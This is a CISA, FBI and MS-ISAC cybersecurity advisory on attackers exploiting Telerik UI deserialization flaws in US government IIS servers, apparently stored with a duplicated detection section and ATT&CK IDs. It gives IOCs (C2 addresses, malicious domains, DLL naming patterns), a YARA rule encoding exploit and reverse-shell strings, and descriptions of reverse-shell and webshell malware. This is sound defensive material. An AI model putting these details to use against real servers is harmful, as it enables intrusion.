CISA and authoring organizations recommend that organizations review the steps listed in this section and Tables 5-10: Identified ATT&CK Techniques for Enterprise to detect similar activity on IIS servers.
Yara Rule
CISA developed the following YARA rule from the base proof-of-concept code for CVE-2019-18935.[6] Note: Authoring organizations do not guarantee all malicious DLL files (if identified) will use the same code provided in this YARA rule.
rule CISA_10424018_01 {meta:        Author = ""CISA Code & Media Analysis""        Incident = ""10424018""        Date = ""2023-02-07""        Last_Modified = ""20230216_1500""        Actor = ""n/a""        Family = ""n/a""        Capabilities = ""n/a""        Malware_Type = ""n/a""        Tool_Type = ""n/a""        Description = ""Detects open-source exploit samples""        SHA256 = ""n/a""    strings:        $s0 = { 3D 20 7B 20 22 63 6D 22 2C 20 22 64 2E 65 22 2C }        $s1 = { 20 22 78 22 2C 20 22 65 22 20 7D 3B }        $s2 = { 52 65 76 65 72 73 65 53 68 65 6C 6C 28 29 }        $s3 = { 54 65 6C 65 72 69 6B 20 55 49 }        $s4 = { 66 69 6C 65 6E 61 6D 65 5F 6C 6F 63 61 6C }        $s5 = { 66 69 6C 65 6E 61 6D 65 5F 72 65 6D 6F 74 65 }        $s6 = { 41 55 43 69 70 68 65 72 2E 65 6E 63 72 79 70 74 }        $s7 = { 31 32 31 66 61 65 37 38 31 36 35 62 61 33 64 34 }$s8 = { 43 6F 6E 6E 65 63 74 53 74 61 67 69 6E 67 53 65 72 76 65 72 28 29 }        $s9 = { 53 74 61 67 69 6E 67 53 65 72 76 65 72 53 6F 63 6B 65 74 }        $s10 = { 2A 62 75 66 66 65 72 20 3D 20 28 75 6E 73 69 67 6E 65 }$s11 = { 28 2A 29 28 29 29 62 75 66 66 65 72 3B 0A 20 20 20 20 66 75 6E 63 28 29 3B }$s12 = { 75 70 6C 6F 61 64 28 70 61 79 6C 6F 61 64 28 54 65 6D 70 54 61 72 67 65 74 }        $s13 = { 36 32 36 31 36 66 33 37 37 35 36 66 32 66 }    condition:($s0 and $s1 and $s2) or ($s3 and $s4 and $s5 and $s6 and $s7) or ($s8 and $s9 and $s10 and $s11) or ($s12 and $s13)}
Log Collection, Retention, and Analysis
CISA, FBI, and MS-ISAC recommend that organizations utilize a centralized log collection and monitoring capability, as well as implement or increase logging and forensic data retention. Longer retention policies improve the availability of data for forensic analysis and aid thorough identification of incident scope.

Centralized log collection and monitoring allows for the discovery of webshell and other exploit activity. For example, organizations should monitor for external connections made from the IIS server to unknown external IP addresses. Logging may also be available—if enabled at the router or firewall—for any outbound connections initiated with PowerShell.
Access- and security-focused firewall (e.g., Web Application Firewall [WAF]) logs can be collected and stored for use in both detection and forensic analysis activities. Organizations should use a WAF to guard against publicly known web application vulnerabilities, in addition to guarding against common web application attacks.

Creation of Malicious DLLs
CISA, FBI, and MS-ISAC recommend that organizations use process monitoring—which provides visibility into file system and application process activity—to detect suspicious executable files running from the C:\Windows\Temp\ directory. Process monitoring via Windows Event Code 4688 will detect the legitimate w3wp.exe process running suspicious DLL files and other anomalous child processes. Note: Enabling this event may inundate security event logging. Use centralized log collection to prevent log rollover, increase log retention and archiving, and/or enable command line event logging.
Forensic analysis commonly identified the threat actors taking the following steps:

Create one of the DLL files (C:\Windows\Temp\1665890187.8690152.dll) by process w3wp.exe PID 6484.
Load the newly created DLL into a currently running IIS process, w3wp.exe PID 6484. 
Make a TCP connection using w3wp.exe PID 6484 to 45.77.212[.]12 over port 443.
Invoke C:\Windows\System32\vcruntime140.dll (Windows C runtime library) to execute payload.

Steps 1 and 2 occur every time a malicious DLL file is created. In some cases, an ASP .NET temp file was created, but this may have indicated benign IIS server activity. Note: The Process ID (PID) used in this example is unique to this investigation and is not universal. IP address 45.77.212[.]12 correlates to TA1, but the pattern can be used as general practice to identify similar activity.
Additional Searching for IIS Servers
The following information was derived from artifact analysis and is provided to equip IT infrastructure defenders searching for similar activity on an IIS server. Several artifacts can be referenced to assist in determining if CVE-2019-18935 has been successfully exploited.
File Type: DLL
Location: - %SystemDrive%\Windows\Temp\
When this CVE is exploited, it uploads malicious DLL files to the C:\Windows\Temp\ directory. The malicious DLL file naming convention translates to the exact time the file was uploaded to the server.
The time is represented in a series of digits, known as Unix Epoch time. The files observed during this investigation contained two sets of digits separated by a period (.) before the DLL extension (.dll). Example: 1667206973.2270932.dll
Nearly all recovered files contain a series of 10 digits to the left of the period (.) and seven digits to the right. However, one file contained only five digits in the second set, which should be taken into consideration when writing regex patterns to search for the existence of these files. Example Regex: \d{10}\.\d{1,8}\.dll
These numbers can be copied and translated from digits into readable language with the month, day, year, hour, minute, and seconds displayed.
Log Type: IIS
Location: - %SystemDrive%\inetpub\logs\LogFiles
When investigating IIS logs, specific fields were searched for and captured during the time of each connection.
If the Unix Epoch time signature has been translated from a DLL filename, specific logs can be searched based on that time. However, if the Unix Epoch time signature has not been translated, the following will still work, but may take longer for the query to run.
The four most important fields to identify this traffic are noted in the following table. These descriptions are sourced directly from Microsoft.[7]

Table 11: Four Fields Searched in IIS Logs


General Name
Field Name
Description




Method
cs-method
Requested action; for example, a GET method


URI Stem
cs-uri-stem
Universal Resource Identifier (URI), or target, of the action


URI Query
cs-uri-query
The query, if any, that the client was trying to perform; A URI query is necessary only for dynamic pages.


Protocol Status
sc-status
Hypertext Transfer Protocol (HTTP) or File Transfer Protocol (FTP) status code



Note: Depending on how logs are collected and stored, the field names may not be an exact match; this should be taken into consideration when constructing queries.
When ingesting logs into security information and event management (SIEM), the final field names did not use a hyphen (-) but used an underscore (_).
Example: cs_method instead of cs-method
Artifacts:

Table 12: Information Contained in Two Observed IIS Events


Field Name
Artifact




cs-method
POST


>cs-uri-stem
/Telerik.Web.UI.WebResource.axd


cs-uri-query
type=rau


sc-status
200 and 302



When reviewing logs, two IIS events were observed with the same timestamp each time this CVE-2019-18935 was exploited. Both events contained the same information in the cs-method, cs-uri-stem, and cs-uri-query. One event had a sc-status of 200 and the other had a sc-status of 302.
Log Type: Windows Event Application Logs
Location: -%SystemDrive%\Windows\System32\winevt\logs\Application.evtx
Kroll Artifact Parser and Extractor (KAPE), a forensic artifact collector and parser, was used to extract the Windows event logs from a backup image of the compromised IIS server. All field names refer to the labels provided via KAPE exports. The strings are of value and can be used to locate other artifacts if different tools are used. Note: The payload data in the following table has been shortened to only necessary strings to obscure and protect victim information.

Table 13: Example Payload Data


EventID
Payload




1309
3005, An unhandled exception has occurred[*redacted*]w3wp.exe[*redacted*]InvalidCastException, Unable to cast object of type 'System.Configuration.Install.AssemblyInstaller' to type 'Telerik.Web.UI.IAsyncUploadConfiguration'.\n at Telerik.Web.UI.AsyncUploadHandler.GetConfiguration(String rawData)\n at Telerik.Web.UI.AsyncUploadHandler.EnsureSetup()\n at Telerik.Web.UI.AsyncUploadHandler.ProcessRequest(HttpContext context)\n at Telerik.Web.UI.HandlerRouter.ProcessHandler(String handlerKey, HttpContext context)\n at Telerik.Web.UI.WebResource.ProcessRequest(HttpContext context)\n at System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()\n at System.Web.HttpApplication.ExecuteStepImpl(IExecutionStep step)\n at System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean&amp; completedSynchronously)\n\n, [*redacted*]/Telerik.Web.UI.WebResource.axd?type=rau, /Telerik.Web.UI.WebResource.axd, [*redacted*], False, [*redacted*], 15, [*redacted*], False, at Telerik.Web.UI.AsyncUploadHandler.GetConfiguration(String rawData)\n at Telerik.Web.UI.AsyncUploadHandler.EnsureSetup()\n at Telerik.Web.UI.AsyncUploadHandler.ProcessRequest(HttpContext context)\n at Telerik.Web.UI.HandlerRouter.ProcessHandler(String handlerKey, HttpContext context)\n at Telerik.Web.UI.WebResource.ProcessRequest(HttpContext context)\n at System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()\n at System.Web.HttpApplication.ExecuteStepImpl(IExecutionStep step)\n at System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean&amp; completedSynchronously)\n"",""Binary"":""""}}



Authoring organizations recommend looking for the following key strings in the payload:

w3wp.exe: This is the parent process that executes the code inside the malicious DLLs.
System.Configuration.Install.AssemblyInstaller: Figure 1 is from the creator’s GitHub repo,[8] where the string can be observed in the code. As presented by Bishop Fox and proven during authoring organizations’ investigation of IIS server logs, an exception does not mean that the exploit failed, but more likely that it executed successfully.[4]


 

Figure 1: Threat Actor Assembly Installer

If a Werfault crash report was written, Windows event application logs may contain evidence of this— even if the DLLs have been removed from the system as part of a cleanup effort by the threat actors.

Table 14: Example Threat Actor Cleanup


EventID
ExecutableInfo
MapDescription
Payload


1000

w3wp.exe |1664175639.65719.dll
|c:\windows\system32\inetsrv\w3wp.exe |C:\Windows\Temp\1664175639.65719.dll

Application Error
{""EventData"":{""Data"":""w3wp.exe, 8.5.9600.16384, 5215df96, 1664175639.65719.dll, 0.0.0.0, 63314d94, c00000fd, 00000000000016f8, 1708, 01d8d0a5f84af443, c:\\windows\\system32\\inetsrv\\w3wp.exe, C:\\Windows\\Temp\\1664175639.65719.dll, eed89eeb-3d68-11ed-817c-005056990ed7"",""Binary"":""""}}


1001
w3wp.exe |1664175639.65719.dll |C:\ProgramData\Microsoft\Windows\WER\ReportQueue\AppCrash_w3wp.exe |C:\ProgramData\Microsoft\Windows\WER\ReportQueue\AppCrash_w3wp.exe |C:\ProgramData\Microsoft\Windows\WER\ReportQueue\AppCrash_w3wp.exe
Application Crash
{""EventData"":{""Data"":""0, APPCRASH, Not available, 0, w3wp.exe, 8.5.9600.16384, 5215df96, 1664175639.65719.dll, 0.0.0.0, 63314d94, c00000fd, 00000000000016f8, \nC:\\Windows\\Temp\\WERE3F6.tmp.appcompat.txt\nC:\\Windows\\Temp\\WERE639.tmp.WERInternalMetadata.xml\nC:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\AppCrash_w3wp.exe_d538da447d49df5862c37684118d0c25c2eff_9e3fd63b_cab_0c3ee656\\memory.hdmp\nC:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\AppCrash_w3wp.exe_d538da447d49df5862c37684118d0c25c2eff_9e3fd63b_cab_0c3ee656\\triagedump.dmp, C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\AppCrash_w3wp.exe_d538da447d49df5862c37684118d0c25c2eff_9e3fd63b_cab_0c3ee656, 0, eed89eeb-3d68-11ed-817c-005056990ed7, 4"",""Binary"":""""}}



The EventID field maps to Windows EventIDs for an easy filter. Users can leverage the Windows EventIDs to find malicious DLL with the Unix Epoch time-based name inside the C:\Windows\Temp\ directory.
Depending how log analysis is performed, various filters can be determined. However, if regex is available, the example listed in Table 14 above can be reused to match the Unix Epoch timestamp convention to assist in filtering.
Additional Analysis
When evidence of malicious DLLs is found, reverse engineering will need to be conducted to fully understand what actions occur as the malicious files could do nearly anything. Leveraging Windows security event logs, as well as Windows PowerShell logs, may provide insight into what actions the DLLs are taking. CISA and authoring organizations recommend the following process:

Convert any discovered malicious DLL timestamps to readable format.
Export the Windows security event and PowerShell logs from the device.

Default path: %SystemDrive%\Windows\System32\winevt\logs\Windows PowerShell
Default path: %SystemDrive%\Windows\System32\winevt\logs\Security.evtx


Filter based on identified timestamps.
Search for new processes created via w3wp.exe in Windows security event logs (e.g., Windows EventID 4688 New Process created).
Search for new PIDs from identified events. Investigate to determine if they spawned any other processes.

Example: CMD.EXE launching PowerShell or running other commands such as nslookup or netstat. Note: This is not an exhaustive list.


Search for EventID 600 in PowerShell logs.

Trellix XDR Platform Searching
If Trellix XDR Platform is deployed in an environment and a standard HX triage audit is completed in a timely manner of the suspected use of CVE-2019-18935, an organization can search for file write events from known web processes. This will identify the executables written by the web server process. CISA and authoring organizations specifically recommend searching for the following field value pair:

Table 15: Field Value Pair for Searching


Field
Value Begins With




TextAtLowestOffset
MZ



MITIGATIONS
Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
Manage Vulnerabilities and Configurations

Upgrade all instances of Telerik UI ASP.NET AJAX to the latest version after appropriate testing. Keep all software up to date and prioritize patching to known exploited vulnerabilities (KEVs). [CPG 5.1]
Prioritize remediation of vulnerabilities on internet-facing systems. For additional guidance, see CISA Insights - Remediate Vulnerabilities for Internet-Accessible Systems. [CPG 5.1]
Implement a patch management solution to ensure compliance with the latest security patches. A patch management solution that inventories all software running in addition to vulnerability scanning is recommended.
Ensure vulnerability scanners are configured to scan a comprehensive scope of devices and locations. For example, as noted in the Technical Details section, the victim organization had the appropriate plugin for CVE-2019-18935, but the vulnerability went undetected due to the Telerik UI software being installed in a file path not typically scanned. To identify unpatched instances of software vulnerabilities, organizations using vulnerability scanners should be aware that all installations may not be considered “typical” and may require full file scans of web applications.

Note: Vulnerability scanners may have limitations in detecting vulnerabilities, such as only being able to identify Windows Installer-installed applications, which was the case with this agency’s vulnerability scanner. The Telerik UI software was installed via a continuous integration (CI) and continuous delivery (CD) pipeline rather than the Windows Installer. This highlights the importance of using a comprehensive approach for vulnerability scanning that considers all potential installation methods and file paths.


Validate output from patch management and vulnerability scanning solutions against running services to check for discrepancies and account for all services.

 Segment Networks Based on Function

Implement network segmentation to separate network segments based on role and functionality. Proper network segmentation significantly reduces the ability for threat actor lateral movement by controlling traffic flows between—and access to—various subnetworks. (See CISA’s Layering Network Security Through Segmentation infographic and the National Security Agency’s Segment Networks and Deploy Application-Aware Defenses.) [CPG 8.1]
Isolate similar systems and implement micro-segmentation with granular access and policy restrictions to modernize cybersecurity and adopt zero trust principles for both network perimeter and internal devices. Logical and physical segmentation are critical to limiting and preventing lateral movement, privilege escalation, and exfiltration. Utilize access control lists (ACLs), hardened firewalls, and network monitoring devices to regulate, monitor, and audit cross-segment access and data transfers.

Other Best Practice Mitigation Recommendations

Implement phishing-resistant multifactor authentication (MFA) for as many services possible—particularly for webmail, virtual private networks (VPNs), accounts that access critical systems, and privileged accounts that manage backups.

MFA can still be leveraged for secure access using a jump server—an asset placed between the external and internal networks that serves as an intermediary for access—to facilitate connections if assets do not have the capability to support MFA implementation.
For additional guidance on secure MFA configurations, visit cisa.gov/mfa. [CPG 1.3]


Monitor and analyze activity logs generated from Microsoft IIS and remote PowerShell. Collect access and security focused logs (IDS/IDPS, firewall, DLP, VPN) and ensure logs are securely stored for a specified duration informed by risk or pertinent regulatory guidance. [CPG 3.1, 3.2]

Evaluate user permissions and maintain separate user accounts for all actions and activities not associated with the administrator role, e.g., for business email, web browsing, etc. All privileges should be reevaluated on a recurring basis to validate continued need for a given set of permissions. [CPG 1.5]


Limit service accounts to the minimum permissions necessary to run services. CISA observed numerous error messages in network logs indicative of failed attempts to write files to additional directories or move laterally.
Maintain a robust asset management policy through comprehensive documentation of assets, tracking current version information to maintain awareness of outdated software, and mapping assets to business and critical functions.

Determine the need and functionality of assets that require public internet exposure. [CPG 2.3]



VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA, FBI, and MS-ISAC recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA and co-sealers recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 5-10).
Align your security technologies against the selected technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program—including people, processes, and technologies—based on the data generated by this process.

CISA, FBI, and MS-ISAC recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES
UNIX Timestamp Converter
REFERENCES
[1] Telerik: Exploiting .NET JavaScriptSerializer Deserialization (CVE-2019-18935)
[2] Exploit Database: Proof-of-Concept Exploit for CVE-2017-9248
[3] ACSC Advisory 2020-004
[4] Bishop Fox CVE-2019-18935: Remote Code Execution via Insecure Deserialization in Telerik UI
[5] Volexity Threat Research: XE Group
[6] GitHub: Proof-of-Concept Exploit for CVE-2019-18935
[7] Microsoft: Configure Logging in IIS
[8] GitHub: CVE-2019-18935
ACKNOWLEDGEMENTS
Google’s Threat Analysis Group (TAG) contributed to this CSA.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1595.002', 'T1083', 'T1190', 'T1070.004', 'T1036.005', 'T1105', 'T1095', 'T1583.003', 'T1070.006', 'TA0011', 'T1505.003', 'T1140', 'T1055.001', 'TA0007', 'T1059.006', 'TA0005', 'T1016'}","



SUMMARY
From November 2022 through early January 2023, the Cybersecurity and Infrastructure Security Agency (CISA) and authoring organizations identified the presence of indicators of compromise (IOCs) at a federal civilian executive branch (FCEB) agency. Analysts determined that multiple cyber threat actors, including an advanced persistent threat (APT) actor, were able to exploit a .NET deserialization vulnerability (CVE-2019-18935) in Progress Telerik user interface (UI) for ASP.NET AJAX, located in the agency’s Microsoft Internet Information Services (IIS) web server. Successful exploitation of this vulnerability allows for remote code execution. According to Progress Software, Telerik UI for ASP.NET AJAX builds before R1 2020 (2020.1.114) are vulnerable to this exploit.,1,
Update June 15, 2023:
As of April 2023, forensic analysis conducted at an additional FCEB agency identified exploitation of CVE-2017-9248 in the agency’s IIS server by unattributed APT actors—specifically within the Telerik UI for ASP.NET AJAX DialogHandler component. This specific analysis is provided as context for existing vulnerabilities within Telerik UI for ASP.NET AJAX.
Update End
Actions to take today to mitigate malicious cyber activity:

Implement a patch management solution to ensure compliance with the latest security patches.
Validate output from patch management and vulnerability scanning against running services to check for discrepancies and account for all services.
Limit service accounts to the minimum permissions necessary to run services.

CISA, the Federal Bureau of Investigation (FBI), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint Cybersecurity Advisory (CSA) to provide IT infrastructure defenders with tactics, techniques, and procedures (TTPs), IOCs, and methods to detect and protect against similar exploitation.
Download the PDF version of this report:


Threat Actors Exploit Progress Telerik Vulnerabilities in Multiple U.S. Government IIS Servers
(PDF,       661.68 KB
  )


For a downloadable copy of IOCs, see below or the JSON file.


AA23-074A STIX XML
(XML,       30.96 KB
  )


For copies of the Malware Analysis Reports (MARs) accompanying this CSA:

MAR-10413062-1.v1 CVE-2019-18935 Exploitation in U.S. Government IIS Server
Update June 15, 2023: MAR-10443863-1.v1 CVE-2017-9248 Exploitation in U.S. Government IIS Server Update End

TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques with corresponding detection and mitigation recommendations.
Overview
CISA and authoring organizations assess that, beginning as late as November 2022, threat actors successfully exploited a .NET deserialization vulnerability (CVE-2019-18935) in an instance of Telerik UI for ASP.NET AJAX Q2 2013 SP1 (version 2013.2.717) running on an FCEB agency’s Microsoft IIS server. This exploit, which results in interactive access with the web server, enabled the threat actors to successfully execute remote code on the vulnerable web server. Though the agency’s vulnerability scanner had the appropriate plugin for CVE-2019-18935, it failed to detect the vulnerability due to the Telerik UI software being installed in a file path it does not typically scan. This may be the case for many software installations, as file paths widely vary depending on the organization and installation method.
In addition to CVE-2019-18935, this version (2013.2.717) of Telerik UI for ASP.NET AJAX contains the following known vulnerabilities: CVE-2017-11357, CVE-2017-11317, and CVE-2017-9248.
Update June 15, 2023:
Forensic analysis conducted at an additional FCEB agency identified exploitation of CVE-2017-9248 in the agency’s IIS server by unattributed APT actors—specifically within the Telerik UI for ASP.NET AJAX DialogHandler component. Activity identified at this agency is separate from the CVE-2019-18935 exploitation listed above and throughout this CSA. Analysis is provided as context for existing vulnerabilities within Telerik UI for ASP.NET AJAX.
Analysis concluded the agency’s IIS server operated an outdated version of Telerik UI for ASP.NET AJAX (2009.3.1.1208.35), which was identified via the Telerik.Web.UI.dll file located in the server's .NET Framework directory. It should be noted that Telerik UI for ASP.NET AJAX versions prior to 2017.2.621 are considered cryptographically weak; this weakness is in the RadAsyncUpload function that uses encryption to secure uploaded files. Proof-of-concept code has been publicly available since January 2018.,2,
Note: The APT actors listed in this June 2023 update were observed leveraging virtual private servers (VPS) to route traffic to their target,. Due to the constant change incurred through use of different VPS infrastructures, the below timeline lists threat actor-controlled IPs that are likely only relevant for hunting during the specified narrow timeline of activity and are not recommended for blocking.
Table 1: Timeline of Unattributed APT Actor Activity (CVE-2017-9248)

CISA and authoring organizations were unable to identify privilege escalation, lateral movement, or data exfiltration. However, the presence of webshells and file uploads indicated APT actors maintained access and had the potential to conduct additional malicious activity.
For more information on the identified malicious files from Table 1, see MAR-10443863-1.v1 CVE-2017-9248 Exploitation in U.S. Government IIS Server.
Update End
Analysis suggests that cyber threat actors exploited CVE-2019-18935 in conjunction with either CVE-2017-11357 or CVE-2017-11317. Australian Cyber Security Centre (ACSC) Advisory 2020-004 assesses that exploitation of CVE-2019-18935 is only possible with knowledge of Telerik RadAsyncUpload encryption keys.,3, Threat actors can obtain these keys through either prior knowledge or exploitation of vulnerabilities—CVE-2017-11357 or CVE-2017-11317—present in older, unpatched versions of Telerik released between 2007 and 2017. Forensic evidence is not available to definitively confirm exploitation of either CVE-2017-11357 or CVE-2017-11317.
Threat Actor Activity
CISA and authoring organizations observed multiple cyber threat actors, including an APT actor—hereafter referred to as Threat Actor 1 (TA1)—and known cybercriminal actor XE Group—hereafter referred to as Threat Actor 2 (TA2)—conducting reconnaissance and scanning activities, that correlate to the successful exploitation of CVE-2019-18935 in the agency’s IIS server running Telerik UI for ASP.NET AJAX,.
When exploiting the vulnerability, the threat actors uploaded malicious dynamic-link library (DLL) files (some masqueraded as portable network graphics,PNG, files), to the C:\Windows\Temp\ directory. The malicious files were then executed from the C:\Windows\Temp\ directory via the w3wp.exe process—a legitimate process that runs on IIS servers. This process is routine for handling requests sent to web servers and delivering content. The review of antivirus logs identified that some DLL files were created, and detected as early as August 2021.
CISA and authoring organizations confirmed that some malicious files dropped on the IIS server are consistent with a previously reported file naming convention that threat actors commonly use when exploiting CVE-2019-18935.,4, The threat actors name the files in the Unix Epoch time format and use the date and time as recorded on the target system. The file naming convention follows the pattern,10 digits,.,7 digits,.dll (e.g., a file created on October 31, 2022, could be 1667203023.5321205.dll).
The names of some of the PNG files were misleading. For example, file 1596835329.5015914.png, which decodes to August 7, 2020, 21:22:09 UTC, first appeared on October 13, 2022, but the file system shows a creation date of August 7, 2020. The uncorrelated Unix Epoch time format may indicate that the threat actors used the timestomping, technique. This file naming convention is a primary IOC used by the threat actors.
In many cases, malicious artifacts were not available for analysis because the threat actors’ malware—that looks for and removes files with the .dll file extension—removed files, from the C:\Windows\Temp\ directory. Through full packet data capture analysis and reverse engineering of malicious DLL files, no indications of additional malicious activity or sub-processes were found executed by the w3wp.exe process. CISA observed error messages being sent to the threat actors’ command and control (C2) server when permission restraints prevented the service account from executing the malicious DLLs and writing new files.
Network activity analysis was consistent with the artifacts provided for review. Analysts did not observe evidence of privilege escalation or lateral movement.
Threat Actor 1
CISA and authoring organizations observed TA1 exploiting CVE-2019-18935 for system enumeration beginning in August 2022. The vulnerability allows a threat actor to upload malicious DLLs on a target system and execute them by abusing a legitimate process, e.g., the w3wp.exe process. In this instance, TA1 was able to upload malicious DLL files to the C:\Windows\Temp\ directory and then achieve remote code execution, executing the DLL files via the w3wp.exe process.
At least nine DLL files used for discovery, C2, and defense evasion,. All of the analyzed samples have network parameters, including host name, domain name, Domain Name System (DNS) server Internet Protocol (IP) address and machine name, Network Basic Input/Output System (NetBIOS) ID, adapter information, IP address, subnet, gateway IP, and Dynamic Host Configuration Protocol (DHCP) server,. All analyzed samples communicate this collected data to a C2 server at IP address 137.184.130,.,162 or 45.77.212,.,12. The C2 traffic to these IP addresses uses a non-application layer protocol, by leveraging Transmission Control Protocol (TCP) clear text (i.e., unencrypted) over port 443. Analysis also identified that:

Some of the analyzed samples can load additional libraries; enumerate the system, processes, files, directories,; and write files.
Other analyzed samples can delete DLL files ending with the .dll extension in the C:\Windows\Temp\ directory on the server. TA1 may use this capability to hide additional malicious activity on the network.

CISA, in coordination with the authoring organizations, identified and observed the following threat actor IPs and timestamps associated with this activity:

Threat Actor 2
TA2—identified as likely the cybercriminal actor XE Group—often includes xe,word, nomenclature in original filenames and registered domains. Volexity lists this naming convention and other observed TTPs as common for this threat actor group.,5,
As early as August 2021, CISA and authoring organizations observed TA2 delivering malicious PNG files that, following analysis, were masqueraded DLL files to avoid detection,. Similar to TA1, TA2 exploited CVE-2019-18935 and was able to upload at least three unique DLL files into the C:\Windows\Temp\ directory that TA2 executed via the w3wp.exe process. These DLL files drop and execute reverse (remote) shell utilities for unencrypted communication with C2 IP addresses associated with the malicious domains listed in Table 3. Note: At the time of analysis, the domains resolved to the listed IP addresses.

Analysis of DLL files determined the files listed in Table 4 were dropped, decoded, and attempted to connect to the respective malicious domains. Embedded payloads dropped by the DLL files were observed using the command line utility certutil,.,exe and writing new files as xesvrs,.,exe to invoke reverse shell utilities execution.

 When the TA2 malware is executed a DLL file drops an executable (XEReverseShell.exe) that attempts to pull a C2 IP address and port number from xework,.,com or xegroups,.,com.

If no port or IP address is found, the program will exit.
If a port and IP address are found, the program will establish a listener and wait for further commands.

If communication is established between the TA2 malware and the C2:

The malware will identify the operating system (Windows or Linux) and create the appropriate shell (cmd or bash), sending system information back to the C2.
The C2 server may send the command xesetshell, causing the malware to connect to the server and download a file called small.txt—a base64-encoded webshell that the malware decodes and places in the C:\Windows\Temp\ directory.
The C2 server may send the command xequit, causing the malware to sleep for a period of time determined by the threat actors.

The two files xesmartshell.tmp and SortVistaCompat have the capability to drop an Active Server Pages (ASPX) webshell—a base64 encoded text file small.txt decoded, as small.aspx,—to enumerate drives; to send, receive, and delete files; and to execute incoming commands. The webshell contains an interface for easily browsing files, directories, or drives on the system, and allows the user to upload or download files to any directory. No webshells were observed to be dropped on the target system, likely due to the abused service account having restrictive write permissions.
For more information on the DLLs, binaries, and webshell, see CISA MAR-10413062-1.v1 CVE-2019-18935 Exploitation in U.S. Government IIS Server.
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 5-10 for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping to the MITRE ATT&CK framework, see CISA’s Decider Tool and Best Practices for MITRE ATT&CK Mapping Guide.

Update June 15, 2023:
Table 6: Resource Development

Table 7: Initial Access

Table 8: Execution

Table 9: Persistence

Table 10: Command and Control

Update End
DETECTION METHODS
CISA and authoring organizations recommend that organizations review the steps listed in this section and Tables 5-10: Identified ATT&CK Techniques for Enterprise to detect similar activity on IIS servers.
Yara Rule
CISA developed the following YARA rule from the base proof-of-concept code for CVE-2019-18935.,6, Note: Authoring organizations do not guarantee all malicious DLL files (if identified) will use the same code provided in this YARA rule.
rule CISA_10424018_01 {meta:        Author = ""CISA Code & Media Analysis""        Incident = ""10424018""        Date = ""2023-02-07""        Last_Modified = ""20230216_1500""        Actor = ""n/a""        Family = ""n/a""        Capabilities = ""n/a""        Malware_Type = ""n/a""        Tool_Type = ""n/a""        Description = ""Detects open-source exploit samples""        SHA256 = ""n/a""    strings:        $s0 = { 3D 20 7B 20 22 63 6D 22 2C 20 22 64 2E 65 22 2C }        $s1 = { 20 22 78 22 2C 20 22 65 22 20 7D 3B }        $s2 = { 52 65 76 65 72 73 65 53 68 65 6C 6C 28 29 }        $s3 = { 54 65 6C 65 72 69 6B 20 55 49 }        $s4 = { 66 69 6C 65 6E 61 6D 65 5F 6C 6F 63 61 6C }        $s5 = { 66 69 6C 65 6E 61 6D 65 5F 72 65 6D 6F 74 65 }        $s6 = { 41 55 43 69 70 68 65 72 2E 65 6E 63 72 79 70 74 }        $s7 = { 31 32 31 66 61 65 37 38 31 36 35 62 61 33 64 34 }$s8 = { 43 6F 6E 6E 65 63 74 53 74 61 67 69 6E 67 53 65 72 76 65 72 28 29 }        $s9 = { 53 74 61 67 69 6E 67 53 65 72 76 65 72 53 6F 63 6B 65 74 }        $s10 = { 2A 62 75 66 66 65 72 20 3D 20 28 75 6E 73 69 67 6E 65 }$s11 = { 28 2A 29 28 29 29 62 75 66 66 65 72 3B 0A 20 20 20 20 66 75 6E 63 28 29 3B }$s12 = { 75 70 6C 6F 61 64 28 70 61 79 6C 6F 61 64 28 54 65 6D 70 54 61 72 67 65 74 }        $s13 = { 36 32 36 31 36 66 33 37 37 35 36 66 32 66 }    condition:($s0 and $s1 and $s2) or ($s3 and $s4 and $s5 and $s6 and $s7) or ($s8 and $s9 and $s10 and $s11) or ($s12 and $s13)}
Log Collection, Retention, and Analysis
CISA, FBI, and MS-ISAC recommend that organizations utilize a centralized log collection and monitoring capability, as well as implement or increase logging and forensic data retention. Longer retention policies improve the availability of data for forensic analysis and aid thorough identification of incident scope.

Centralized log collection and monitoring allows for the discovery of webshell and other exploit activity. For example, organizations should monitor for external connections made from the IIS server to unknown external IP addresses. Logging may also be available—if enabled at the router or firewall—for any outbound connections initiated with PowerShell.
Access- and security-focused firewall (e.g., Web Application Firewall,WAF,) logs can be collected and stored for use in both detection and forensic analysis activities. Organizations should use a WAF to guard against publicly known web application vulnerabilities, in addition to guarding against common web application attacks.

Creation of Malicious DLLs
CISA, FBI, and MS-ISAC recommend that organizations use process monitoring—which provides visibility into file system and application process activity—to detect suspicious executable files running from the C:\Windows\Temp\ directory. Process monitoring via Windows Event Code 4688 will detect the legitimate w3wp.exe process running suspicious DLL files and other anomalous child processes. Note: Enabling this event may inundate security event logging. Use centralized log collection to prevent log rollover, increase log retention and archiving, and/or enable command line event logging.
Forensic analysis commonly identified the threat actors taking the following steps:

